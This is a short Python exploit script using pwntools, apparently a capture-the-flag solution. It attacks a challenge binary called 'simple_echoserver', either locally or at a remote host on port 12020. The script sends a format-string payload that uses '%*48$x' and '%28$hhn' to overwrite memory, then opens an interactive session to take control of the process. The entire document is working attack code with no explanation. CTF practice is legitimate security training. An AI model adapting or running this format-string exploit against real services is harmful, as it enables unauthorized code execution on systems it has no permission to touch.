from pwn import *

e = ELF("./simple_echoserver")
libc = ELF("./libc.so.6")

context.binary = e.path

devnull = open('/dev/null', 'w+b')

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p, "b fprintf")

if is_remote:
  p = remote("pwnable.org", 12020)
else:
  p = process(e.path, stderr=devnull)
  # {"LD_PRELOAD": libc.path})

debug()

p.sendlineafter("name:", "%" + str(0x2d72e - len("[USER] name: ")) + "x" + "%*48$x" + "%28$hhn")
p.sendlineafter("phone:", "1" * 7)

p.sendlineafter("yourself!", "~.")

p.interactive()
